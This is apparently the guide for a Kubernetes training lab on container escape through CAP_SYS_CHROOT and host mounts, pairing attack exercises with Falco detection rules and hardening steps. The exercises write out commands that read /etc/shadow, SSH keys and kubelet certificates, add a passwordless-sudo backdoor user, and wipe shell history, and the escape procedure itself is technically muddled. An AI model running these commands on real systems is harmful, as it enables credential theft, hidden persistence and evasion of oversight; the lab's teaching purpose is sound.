# Chroot Escape Attack Lab

This comprehensive lab demonstrates how chroot-based container escapes can work when containers have CAP_SYS_CHROOT and access to a host-like filesystem. The lab focuses on privilege escalation, detection, and mitigation strategies.

## 🎯 Lab Overview

### Attack Scenarios Covered:
1. **Chroot Escape** using CAP_SYS_CHROOT capability
2. **Host Filesystem Access** through volume mounts
3. **Privilege Escalation** via container escape
4. **Credential Harvesting** from host filesystem
5. **Persistence** through host access

### Security Concepts Demonstrated:
- **Chroot Escape Techniques** for container breakout
- **Capability Abuse** for privilege escalation
- **Host Filesystem Access** for data exfiltration
- **Detection and Prevention** strategies
- **Secure Container Configuration** best practices

## 🏗️ Lab Architecture

### Vulnerable Environment (`chroot-escape-lab` namespace):
```
chroot-escape-lab/
├── Namespaces: chroot-escape-lab
├── ServiceAccounts: escape-sa (overly permissive)
├── RBAC: 
│   ├── Role: escape-role (excessive permissions)
│   └── RoleBinding: escape-role-binding
├── Pods:
│   ├── host-simulator (privileged pod with host access)
│   ├── chroot-escape-target (vulnerable app with CAP_SYS_CHROOT)
│   └── secure-app (secure app for comparison)
├── Secrets: app-secrets
└── ConfigMaps: app-config
```

### Secure Environment (`secure-chroot-lab` namespace):
```
secure-chroot-lab/
├── Namespaces: secure-chroot-lab
├── ServiceAccounts: secure-escape-sa (minimal permissions)
├── RBAC:
│   ├── Role: secure-escape-role (restricted permissions)
│   └── RoleBinding: secure-escape-role-binding
├── Pods:
│   └── secure-app (properly secured)
├── PodSecurityPolicy: secure-chroot-psp
├── NetworkPolicy: secure-chroot-netpol
└── Secrets: secure-app-secrets, secure-db-secrets
```

## 🚀 Quick Start

### Option 1: Automated Deployment
```bash
# Deploy complete lab environment
./kubeshadow lab --provider minikube --dashboard

# Deploy chroot escape lab
kubectl apply -f modules/lab/manifests/13-chroot-escape.yaml
kubectl apply -f modules/lab/manifests/14-secure-chroot.yaml
```

### Option 2: Manual Deployment
```bash
# Start minikube
minikube start --driver=docker --memory=4096 --cpus=2

# Deploy lab manifests
kubectl apply -f modules/lab/manifests/13-chroot-escape.yaml
kubectl apply -f modules/lab/manifests/14-secure-chroot.yaml

# Verify deployment
kubectl get pods -n chroot-escape-lab
kubectl get pods -n secure-chroot-lab
```

## 🔍 Lab Exercises

### Exercise 1: Reconnaissance and Target Identification

#### Objective:
Identify vulnerable containers and understand the attack surface.

#### Steps:
1. **List all pods in the vulnerable namespace:**
   ```bash
   kubectl get pods -n chroot-escape-lab -o wide
   ```

2. **Examine pod configurations:**
   ```bash
   kubectl describe pod host-simulator -n chroot-escape-lab
   kubectl describe pod chroot-escape-target -n chroot-escape-lab
   kubectl describe pod secure-app -n chroot-escape-lab
   ```

3. **Check security contexts:**
   ```bash
   kubectl get pod chroot-escape-target -n chroot-escape-lab -o yaml | grep -A 20 securityContext
   kubectl get pod host-simulator -n chroot-escape-lab -o yaml | grep -A 20 securityContext
   ```

4. **Identify capabilities:**
   ```bash
   kubectl get pod chroot-escape-target -n chroot-escape-lab -o yaml | grep -A 10 capabilities
   ```

5. **Check volume mounts:**
   ```bash
   kubectl get pod chroot-escape-target -n chroot-escape-lab -o yaml | grep -A 10 volumeMounts
   ```

#### Expected Results:
- Multiple pods with different security levels
- Host simulator with privileged access
- Target container with CAP_SYS_CHROOT
- Secure container for comparison

### Exercise 2: Chroot Escape Attack

#### Objective:
Exploit CAP_SYS_CHROOT to escape container and access host filesystem.

#### Steps:
1. **Access the vulnerable container:**
   ```bash
   kubectl exec -it chroot-escape-target -n chroot-escape-lab -- /bin/sh
   ```

2. **Check current capabilities:**
   ```bash
   # Check current user and capabilities
   id
   cat /proc/self/status | grep CapEff
   capsh --print
   ```

3. **Explore mounted host filesystem:**
   ```bash
   # Check mounted host filesystem
   ls -la /host/
   ls -la /host/etc/
   ls -la /host/root/
   ```

4. **Perform chroot escape:**
   ```bash
   # Create a new root directory
   mkdir -p /tmp/escape
   
   # Copy essential files for chroot
   cp -r /host/bin /tmp/escape/
   cp -r /host/lib /tmp/escape/
   cp -r /host/lib64 /tmp/escape/
   cp -r /host/usr /tmp/escape/
   cp -r /host/etc /tmp/escape/
   
   # Create necessary directories
   mkdir -p /tmp/escape/proc
   mkdir -p /tmp/escape/sys
   mkdir -p /tmp/escape/dev
   mkdir -p /tmp/escape/tmp
   mkdir -p /tmp/escape/var
   
   # Mount proc, sys, dev
   mount -t proc proc /tmp/escape/proc
   mount -t sysfs sys /tmp/escape/sys
   mount -t devtmpfs dev /tmp/escape/dev
   
   # Perform chroot escape
   chroot /tmp/escape /bin/sh
   ```

5. **Verify escape:**
   ```bash
   # Check if we're in the host filesystem
   pwd
   ls -la /
   cat /etc/passwd
   cat /etc/shadow
   ```

#### Expected Results:
- Successful chroot escape to host filesystem
- Access to host files and directories
- Potential access to sensitive host data

### Exercise 3: Host Filesystem Exploration

#### Objective:
Explore the host filesystem and extract sensitive information.

#### Steps:
1. **Access host filesystem:**
   ```bash
   # After chroot escape, explore host filesystem
   ls -la /root/
   ls -la /home/
   ls -la /etc/
   ```

2. **Extract credentials:**
   ```bash
   # Look for SSH keys
   ls -la /root/.ssh/
   cat /root/.ssh/id_rsa
   cat /root/.ssh/authorized_keys
   
   # Look for Kubernetes secrets
   ls -la /etc/kubernetes/
   cat /etc/kubernetes/pki/ca.crt
   cat /var/lib/kubelet/pki/kubelet-client-current.pem
   ```

3. **Check running processes:**
   ```bash
   # List running processes
   ps aux
   netstat -tulpn
   
   # Check for other containers
   docker ps
   ```

4. **Access sensitive data:**
   ```bash
   # Look for application data
   ls -la /var/lib/
   ls -la /opt/
   
   # Check for configuration files
   cat /etc/hosts
   cat /etc/resolv.conf
   ```

#### Expected Results:
- Access to host credentials and keys
- Discovery of Kubernetes secrets
- Information about running processes
- Potential for further lateral movement

### Exercise 4: Privilege Escalation

#### Objective:
Use host access to escalate privileges and establish persistence.

#### Steps:
1. **Check current privileges:**
   ```bash
   # Check current user
   id
   whoami
   
   # Check sudo access
   sudo -l
   ```

2. **Attempt privilege escalation:**
   ```bash
   # Try to become root
   sudo su -
   
   # Check for SUID binaries
   find / -perm -4000 2>/dev/null
   
   # Check for writable files
   find / -writable 2>/dev/null | head -20
   ```

3. **Establish persistence:**
   ```bash
   # Create backdoor user
   useradd -m -s /bin/bash backdoor
   echo "backdoor:password123" | chpasswd
   
   # Add to sudoers
   echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
   
   # Create SSH key
   ssh-keygen -t rsa -b 4096 -f /home/backdoor/.ssh/id_rsa -N ""
   ```

4. **Cover tracks:**
   ```bash
   # Clear command history
   history -c
   rm -f /root/.bash_history
   
   # Remove evidence
   rm -rf /tmp/escape
   ```

#### Expected Results:
- Successful privilege escalation
- Establishment of persistent access
- Covering of attack tracks

### Exercise 5: Secure Environment Testing

#### Objective:
Test the secure environment to understand proper security configurations.

#### Steps:
1. **Test RBAC restrictions:**
   ```bash
   kubectl auth can-i get secrets --as=system:serviceaccount:secure-chroot-lab:secure-escape-sa -n secure-chroot-lab
   kubectl auth can-i get pods --as=system:serviceaccount:secure-chroot-lab:secure-escape-sa -n secure-chroot-lab
   ```

2. **Attempt chroot escape:**
   ```bash
   # Access secure container
   kubectl exec -it secure-app -n secure-chroot-lab -- /bin/sh
   
   # Try chroot escape (should fail)
   chroot /host /bin/sh
   ```

3. **Test network policies:**
   ```bash
   kubectl get networkpolicies -n secure-chroot-lab
   kubectl describe networkpolicy secure-chroot-netpol -n secure-chroot-lab
   ```

4. **Verify pod security standards:**
   ```bash
   kubectl get pods -n secure-chroot-lab -o yaml | grep securityContext
   ```

#### Expected Results:
- RBAC restrictions prevent unauthorized access
- Chroot escape attempts fail
- Network policies restrict communication
- Pod security standards are enforced

### Exercise 6: Detection and Monitoring

#### Objective:
Implement detection rules and monitor for chroot escape attacks.

#### Steps:
1. **Review detection rules:**
   ```bash
   kubectl get configmap chroot-escape-scenarios -n chroot-escape-lab -o yaml
   ```

2. **Test Falco rules (if available):**
   ```bash
   # Install Falco
   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-rbac.yaml
   kubectl apply -f https://raw.githubusercontent.com/falcosecurity/falco/master/deploy/kubernetes/falco-daemonset.yaml
   ```

3. **Monitor audit logs:**
   ```bash
   # Check audit logs for chroot operations
   kubectl logs -n kube-system -l app=falco | grep "chroot"
   ```

4. **Test detection rules:**
   ```bash
   # Perform chroot escape and monitor logs
   kubectl exec -it chroot-escape-target -n chroot-escape-lab -- chroot /host /bin/sh
   ```

#### Expected Results:
- Detection rules identify chroot operations
- Audit logs show security events
- Monitoring alerts for suspicious activity

### Exercise 7: Cleanup and Mitigation

#### Objective:
Clean up the lab environment and implement security measures.

#### Steps:
1. **Remove compromised containers:**
   ```bash
   kubectl delete pod chroot-escape-target -n chroot-escape-lab
   kubectl delete pod host-simulator -n chroot-escape-lab
   kubectl delete pod secure-app -n chroot-escape-lab
   ```

2. **Revoke overly permissive RBAC:**
   ```bash
   kubectl delete rolebinding escape-role-binding -n chroot-escape-lab
   kubectl delete role escape-role -n chroot-escape-lab
   ```

3. **Implement secure RBAC:**
   ```bash
   kubectl apply -f modules/lab/manifests/14-secure-chroot.yaml
   ```

4. **Verify security improvements:**
   ```bash
   kubectl auth can-i get secrets --as=system:serviceaccount:chroot-escape-lab:escape-sa -n chroot-escape-lab
   ```

#### Expected Results:
- Compromised containers removed
- RBAC permissions restricted
- Security measures implemented
- Access properly controlled

### Exercise 8: Analysis and Reporting

#### Objective:
Analyze the attack scenarios and create security recommendations.

#### Steps:
1. **Document findings:**
   - List all vulnerabilities discovered
   - Document attack vectors used
   - Record data accessed and exfiltrated

2. **Create security recommendations:**
   - RBAC improvements
   - Pod security standards
   - Network policies
   - Monitoring and detection

3. **Develop incident response procedures:**
   - Detection methods
   - Response steps
   - Recovery procedures
   - Prevention measures

#### Expected Results:
- Comprehensive security assessment
- Detailed recommendations
- Incident response procedures
- Prevention strategies

## 🛡️ Security Vulnerabilities

### High Severity:
- **CAP_SYS_CHROOT capability** allowing chroot escape
- **Host filesystem access** through volume mounts
- **Privileged containers** with excessive capabilities
- **Overly permissive RBAC** enabling attacks

### Medium Severity:
- **Weak security contexts** in containers
- **Excessive capabilities** granted to containers
- **Host volume mounts** for container escape
- **Unrestricted network access**

### Low Severity:
- **Verbose logging** with sensitive data
- **Default service accounts** with permissions
- **Missing network policies**
- **Insufficient monitoring**

## 🔍 Detection and Prevention

### Detection Rules (Falco):
```yaml
- rule: Chroot Operation
  desc: Detect chroot operations
  condition: >
    ka.verb=create and
    ka.target.resource=pods and
    ka.req.pod.spec.containers[0].securityContext.capabilities.add contains "SYS_CHROOT"
  output: >
    Chroot capability detected (user=%ka.user.name
    pod=%ka.target.name namespace=%ka.target.namespace)
  priority: WARNING

- rule: Host Filesystem Mount
  desc: Detect host filesystem mounts
  condition: >
    ka.verb=create and
    ka.target.resource=pods and
    ka.req.pod.spec.volumes[0].hostPath
  output: >
    Host filesystem mount detected (user=%ka.user.name
    pod=%ka.target.name namespace=%ka.target.namespace
    path=%ka.req.pod.spec.volumes[0].hostPath.path)
  priority: WARNING

- rule: Privileged Container
  desc: Detect privileged containers
  condition: >
    ka.verb=create and
    ka.target.resource=pods and
    ka.req.pod.spec.containers[0].securityContext.privileged=true
  output: >
    CRITICAL: Privileged container detected (user=%ka.user.name
    pod=%ka.target.name namespace=%ka.target.namespace)
  priority: CRITICAL

- rule: Excessive Capabilities
  desc: Detect containers with excessive capabilities
  condition: >
    ka.verb=create and
    ka.target.resource=pods and
    ka.req.pod.spec.containers[0].securityContext.capabilities.add
  output: >
    WARNING: Container with capabilities detected (user=%ka.user.name
    pod=%ka.target.name namespace=%ka.target.namespace
    capabilities=%ka.req.pod.spec.containers[0].securityContext.capabilities.add)
  priority: WARNING
```

### Prevention Measures:
1. **Capability Restrictions**: Remove CAP_SYS_CHROOT
2. **Pod Security Standards**: Implement security contexts
3. **Network Policies**: Restrict network access
4. **Admission Controllers**: Validate configurations
5. **Comprehensive Monitoring**: Detect and respond to threats

## 🧹 Cleanup

### Remove Lab Environment:
```bash
# Remove vulnerable environment
kubectl delete namespace chroot-escape-lab

# Remove secure environment
kubectl delete namespace secure-chroot-lab

# Or use automated cleanup
./kubeshadow lab cleanup
```

### Manual Cleanup:
```bash
# Remove specific resources
kubectl delete -f modules/lab/manifests/14-secure-chroot.yaml
kubectl delete -f modules/lab/manifests/13-chroot-escape.yaml
```

## 📊 Monitoring and Analysis

### Dashboard Integration:
```bash
# Start KubeShadow dashboard
./kubeshadow dashboard

# Run commands with monitoring
./kubeshadow recon --dashboard
./kubeshadow rbac-escalate --dashboard
```

### Key Metrics to Monitor:
- Chroot operations frequency
- Host filesystem access attempts
- Privileged container usage
- Unusual network patterns
- Resource usage anomalies

## 🎓 Learning Outcomes

### Students will learn to:
1. **Identify chroot escape vulnerabilities** in container configurations
2. **Exploit CAP_SYS_CHROOT** for privilege escalation
3. **Perform container escape** techniques
4. **Extract sensitive data** from host filesystem
5. **Implement security controls** to prevent attacks
6. **Detect and respond** to security incidents

### Security Skills Developed:
- **Container Security Assessment**
- **Capability Analysis**
- **Host Filesystem Security**
- **Incident Response Procedures**
- **Security Control Implementation**

## 🚨 Security Warning

**⚠️ IMPORTANT**: This lab contains intentionally vulnerable configurations for educational purposes only. Never deploy these configurations in production environments.

### Safety Guidelines:
1. **Lab Environment Only** - Never use in production
2. **Network Isolation** - Ensure lab clusters are isolated
3. **Resource Monitoring** - Monitor cloud resource usage
4. **Access Control** - Limit access to lab environments
5. **Data Sensitivity** - No real sensitive data should be used

## 📚 Additional Resources

### Documentation:
- [Kubernetes Security Contexts](https://kubernetes.io/docs/concepts/security/security-context/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Chroot Security](https://en.wikipedia.org/wiki/Chroot)
- [Falco Security Monitoring](https://falco.org/)

### Tools and References:
- [KubeShadow Documentation](../README.md)
- [Lab Usage Examples](../../examples/lab-usage.md)
- [Security Testing Guide](../../docs/security-testing.md)
- [Dashboard User Guide](../../docs/dashboard.md)

## 🤝 Contributing

We welcome contributions to improve the chroot escape lab:

1. **Report issues** with lab deployments
2. **Suggest new attack scenarios** for educational value
3. **Improve detection rules** and prevention measures
4. **Enhance documentation** and examples
5. **Add new security controls** and best practices

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](../../LICENSE) file for details.

## 🙏 Acknowledgments

- **Kubernetes community** for the excellent platform
- **Security researchers** who identified the vulnerabilities we simulate
- **Educational institutions** that provided feedback on lab scenarios
- **Open source contributors** who made this project possible

---

**Happy Learning! 🚀**

The Chroot Escape Attack Lab provides hands-on experience with advanced container security testing. Practice responsibly and always follow ethical guidelines!

For questions, issues, or contributions, please visit our [GitHub repository](https://github.com/kubeshadow/kubeshadow).
